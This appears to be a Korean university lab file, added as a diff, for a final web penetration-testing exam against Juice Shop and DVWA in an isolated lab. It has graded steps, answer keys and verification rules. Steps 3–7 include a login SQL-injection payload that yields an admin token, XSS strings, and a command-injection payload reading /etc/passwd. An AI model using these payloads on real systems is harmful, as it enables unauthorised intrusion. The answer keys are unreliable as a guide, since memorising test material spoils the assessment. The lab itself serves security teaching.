@@ -1,0 +1,307 @@
+lab_id: standalone-web-vuln-week15
+title: "기말: 종합 웹 침투 점검 — 정찰→침해→위험평가→보고 전 과정"
+version: standalone-web-vuln
+course: web-vuln
+week: 15
+description: |
+  기말 종합 — WSTG 한 바퀴: 정찰(nuclei)→인증 우회(SQLi/JWT)→주입(SQLi/XSS/RCE)→접근제어(A01)
+  →위험 평가(CVSS)→전문 보고. juice/dvwa 대상. 공격은 el34-attacker. 인가된 실습만. 명령은 el34 호스트에서.
+difficulty: hard
+duration_minutes: 200
+prerequisites:
+  - "W01–W14 통과"
+  - "el34 호스트 SSH + docker exec"
+  - "전 주차 점검·평가·보고 역량"
+objectives:
+  - "WSTG 전 과정 통합 수행"
+  - "발견을 CVSS로 정량화"
+  - "전문 침투 보고서 작성"
+pass_threshold: 0.7
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 점검 — 대상 도달
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "curl -sk -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/"
+      ```
+      ## ✅ 합격 기준
+      대상 도달.
+    hint: '도달성'
+    category: survey
+    points: 8
+    answer: |
+      docker exec el34-attacker sh -c "curl -sk -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/"
+    answer_detail: "기말 종합 점검 대상 = juiceshop/dvwa."
+    verify:
+      type: output_contains
+      expect: 'juice'
+      field: stdout
+      semantic:
+        intent: "대상 점검"
+        success_criteria: ["도달"]
+        acceptable_methods: ["**[OSS] curl (권장)**"]
+    target_vm: web
+
+  - order: 2
+    instruction: |
+      ## 🎯 정찰 — nuclei 기술/헤더
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "nuclei -u http://10.20.30.1 -H 'Host: juice.el34.lab' -t /root/nuclei-templates/http/technologies/tech-detect.yaml -t /root/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml -silent -nc 2>/dev/null | head -8"
+      ```
+      ## ✅ 합격 기준
+      자동 정찰로 기술/보안헤더 누락을 매핑한다.
+    hint: 'nuclei 정찰'
+    category: recon
+    points: 10
+    answer: |
+      echo "=== 정찰 (nuclei) ==="
+      docker exec el34-attacker sh -c "nuclei -u http://10.20.30.1 -H 'Host: juice.el34.lab' -t /root/nuclei-templates/http/technologies/tech-detect.yaml -t /root/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml -silent -nc 2>/dev/null | tee /tmp/wv15n.txt | head -8; echo nuclei_findings=\$(wc -l < /tmp/wv15n.txt); rm -f /tmp/wv15n.txt"
+      echo "→ 기술 핑거프린팅 + 보안 헤더 누락 자동 매핑(다건 탐지)"
+    answer_detail: "정찰 = nuclei로 기술/헤더 자동 매핑. 수동 정찰과 교차. 다건 탐지."
+    verify:
+      type: output_contains
+      expect: 'nuclei_findings='
+      field: stdout
+      semantic:
+        intent: "자동 정찰"
+        success_criteria: ["기술/헤더 매핑"]
+        acceptable_methods: ["**[OSS] nuclei (권장)**"]
+    target_vm: web
+
+  - order: 3
+    instruction: |
+      ## 🎯 인증 우회 — 로그인 SQLi
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | head -c 100; rm -f /tmp/wv15.json'
+      ```
+      ## ✅ 합격 기준
+      로그인 SQLi 우회로 JWT 획득.
+    hint: "' OR 1=1-- → token"
+    category: manipulation
+    points: 12
+    answer: |
+      echo "=== 인증 우회 (로그인 SQLi) ==="
+      docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | head -c 120; rm -f /tmp/wv15.json'
+      echo ""
+    answer_detail: "인증 우회 = ' OR 1=1-- → admin JWT(A07)."
+    verify:
+      type: output_contains
+      expect: 'authentication'
+      field: stdout
+      semantic:
+        intent: "인증 우회"
+        success_criteria: ["token"]
+        acceptable_methods: ["**[OSS] login SQLi (권장)**"]
+    target_vm: web
+
+  - order: 4
+    instruction: |
+      ## 🎯 JWT 분석
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/"); echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 150; rm -f /tmp/wv15.json'
+      ```
+      ## ✅ 합격 기준
+      JWT payload(email) 노출 확인.
+    hint: 'JWT 디코드'
+    category: analysis
+    points: 10
+    answer: |
+      echo "=== JWT payload 분석 ==="
+      docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/"); echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 200; rm -f /tmp/wv15.json'
+      echo ""
+    answer_detail: "JWT payload base64 디코드 → email 노출(서명 검증 전 평문)."
+    verify:
+      type: output_contains
+      expect: 'email'
+      field: stdout
+      semantic:
+        intent: "JWT 분석"
+        success_criteria: ["payload 노출"]
+        acceptable_methods: ["**[OSS] JWT 디코드 (권장)**"]
+    target_vm: web
+
+  - order: 5
+    instruction: |
+      ## 🎯 주입 — SQLi/XSS (WAF 탐지)
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'sqli=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20OR%20%271%27=%271\"; curl -s -o /dev/null -w 'xss=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?q=%3Cscript%3Ealert(1)%3C/script%3E\""
+      ```
+      ## ✅ 합격 기준
+      SQLi/XSS 주입이 WAF(403)에 탐지·차단된다.
+    hint: 'SQLi/XSS 403'
+    category: manipulation
+    points: 12
+    answer: |
+      echo "=== 주입 (SQLi/XSS) ==="
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'sqli=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20OR%20%271%27=%271\"; curl -s -o /dev/null -w 'xss=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?q=%3Cscript%3Ealert(1)%3C/script%3E\""
+      echo "→ dvwa는 ModSec 942(SQLi)/941(XSS) 차단형 403"
+    answer_detail: "주입 = SQLi(942)/XSS(941) 시도. dvwa는 차단형 → 403."
+    verify:
+      type: output_contains
+      expect: 'sqli='
+      field: stdout
+      semantic:
+        intent: "주입 시도"
+        success_criteria: ["SQLi/XSS 탐지"]
+        acceptable_methods: ["**[OSS] 주입 (권장)**"]
+    target_vm: web
+
+  - order: 6
+    instruction: |
+      ## 🎯 RCE 시도 — 명령주입
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'rce=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=1;cat%20/etc/passwd'"
+      ```
+      ## ✅ 합격 기준
+      명령주입(RCE) 시도가 탐지된다.
+    hint: ';cat /etc/passwd'
+    category: manipulation
+    points: 12
+    answer: |
+      echo "=== RCE 시도 (명령주입) ==="
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'rce=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=1;cat%20/etc/passwd'"
+      echo "→ ;cmd = OS 명령 연결. ModSec 932(RCE) 탐지. 성공 시 완전 장악(최고 심각도)"
+    answer_detail: "RCE = 명령주입(;cmd). ModSec 932 탐지. 가장 심각한 등급."
+    verify:
+      type: output_contains
+      expect: 'rce='
+      field: stdout
+      semantic:
+        intent: "RCE 시도"
+        success_criteria: ["명령주입 탐지"]
+        acceptable_methods: ["**[OSS] ;cmd 주입 (권장)**"]
+    target_vm: web
+
+  - order: 7
+    instruction: |
+      ## 🎯 접근제어 — 무인증 관리/강제 브라우징
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "curl -sk -o /dev/null -w 'admincfg=%{http_code} ' -H 'Host: juice.el34.lab' http://10.20.30.1/rest/admin/application-configuration; curl -sk -o /dev/null -w 'ftp=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/ftp"
+      ```
+      ## ✅ 합격 기준
+      무인증 관리(200)/강제 브라우징을 확인한다.
+    hint: 'admin-config/ftp'
+    category: manipulation
+    points: 12
+    answer: |
+      echo "=== 접근제어 (A01) ==="
+      docker exec el34-attacker sh -c "curl -sk -o /dev/null -w 'admincfg=%{http_code} ' -H 'Host: juice.el34.lab' http://10.20.30.1/rest/admin/application-configuration; curl -sk -o /dev/null -w 'ftp=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/ftp"
+      echo "→ admin-config 200(무인증 관리 노출) + /ftp 강제 브라우징 = A01"
+    answer_detail: "접근제어 = 무인증 관리(admin-config 200) + 강제 브라우징(/ftp). A01."
+    verify:
+      type: output_contains
+      expect: 'admincfg=200'
+      field: stdout
+      semantic:
+        intent: "접근제어 우회"
+        success_criteria: ["무인증 관리/강제브라우징"]
+        acceptable_methods: ["**[OSS] 강제 접근 (권장)**"]
+    target_vm: web
+
+  - order: 8
+    instruction: |
+      ## 🎯 위험 평가 — CVSS
+      ## 💻 실행 명령
+      ```bash
+      echo "SQLi/RCE: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical"
+      ```
+      ## ✅ 합격 기준
+      발견을 CVSS로 정량화한다.
+    hint: 'CVSS 9.8'
+    category: analysis
+    points: 12
+    answer: |
+      echo "=== 위험 평가 (CVSS) ==="
+      echo "SQLi(인증우회): CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical"
+      echo "RCE(명령주입): 9.8 Critical"
+      echo "접근제어 A01: 7.5 High"
+      echo "XSS/정보노출: 6.1/5.3 Medium"
+      echo "→ Critical 2 + High 1 + Medium 2"
+    answer_detail: "위험 평가 = CVSS 3.1 정량화. 무인증 원격 SQLi/RCE = 9.8 Critical."
+    verify:
+      type: output_contains
+      expect: '9.8'
+      field: stdout
+      semantic:
+        intent: "위험 평가"
+        success_criteria: ["CVSS 점수"]
+        acceptable_methods: ["**[표준] CVSS 3.1 (권장)**"]
+    target_vm: web
+
+  - order: 9
+    instruction: |
+      ## 🎯 권고 — 발견별 조치
+      ## 💻 실행 명령
+      ```bash
+      echo "SQLi:파라미터화, XSS:인코딩+CSP, RCE:입력검증, A01:서버측인가, 정보노출:generic에러"
+      ```
+      ## ✅ 합격 기준
+      발견별 구체 권고를 제시한다.
+    hint: '파라미터화/인가'
+    category: report
+    points: 10
+    answer: |
+      echo "=== 권고 ==="
+      echo "SQLi: 파라미터화 쿼리(근본)"
+      echo "XSS: 문맥별 출력 인코딩 + CSP"
+      echo "RCE: OS 호출 회피(API) + 입력 allowlist"
+      echo "A01: 서버측 객체수준 인가 + 기본 deny"
+      echo "정보 노출: generic 에러 + 배너 억제, 보안 헤더(HSTS/CSP) 추가"
+      echo "→ 우선순위: Critical 2(SQLi/RCE) 즉시 → A01 → Medium"
+    answer_detail: "권고 = 발견별 구체 조치 + 우선순위. 파라미터화/인코딩/인가/generic에러."
+    verify:
+      type: output_contains
+      expect: '파라미터화'
+      field: stdout
+      semantic:
+        intent: "수정 권고"
+        success_criteria: ["구체 조치"]
+        acceptable_methods: ["**[설명] 권고 (권장)**"]
+    target_vm: web
+
+  - order: 10
+    instruction: |
+      ## 🎯 전문 침투 보고서
+      ## 💻 보고서 양식
+      ```markdown
+      # 웹 침투 점검 기말 보고서 (학번, 이름)
+      ## 1. Executive Summary
+      ## 2. 범위/방법론(WSTG)
+      ## 3. 발견(CVSS/PoC/권고)
+      ## 4. 우선순위 + 결론
+      ```
+      ## ✅ 합격 기준
+      Executive~발견(CVSS/PoC)~권고를 갖춘 전문 보고서를 작성한다.
+    hint: 'Exec/CVSS/PoC/권고'
+    category: report
+    points: 10
+    answer: |
+      cat <<'EOF'
+      # 웹 침투 점검 기말 보고서
+      ## 1. Executive Summary: Critical 2(SQLi/RCE) 포함 5건. 무인증 원격 데이터 침해·시스템 장악 가능(일부 WAF 차단). 즉시 조치 필요
+      ## 2. 범위/방법론: JuiceShop/dvwa, WSTG, el34 인가 실습
+      ## 3. 발견:
+      ##   - SQLi 9.8 Critical: PoC(' OR 1=1-- → 관리자 JWT), 권고(파라미터화)
+      ##   - RCE 9.8 Critical: PoC(;cat /etc/passwd → 932 탐지), 권고(입력검증)
+      ##   - 접근제어 A01 7.5 High: PoC(admin-config 200, /ftp), 권고(서버측 인가)
+      ##   - XSS/정보노출 Medium: 권고(인코딩+CSP/generic 에러)
+      ## 4. 우선순위: Critical 2 → A01 → Medium. 결론: 점검→CVSS 정량화→재현가능 보고로 행동 가능하게
+      EOF
+    answer_detail: "전문 보고서 = Exec Summary + 방법론(WSTG) + 발견(CVSS/PoC/권고) + 우선순위. 한 학기 통합."
+    verify:
+      type: output_contains
+      expect: 'CVSS'
+      field: stdout
+      semantic:
+        intent: "전문 침투 보고서"
+        success_criteria: ["Exec/CVSS/PoC/권고"]
+        acceptable_methods: ["**[관리적] 보고서 (권장)**"]
+    target_vm: web
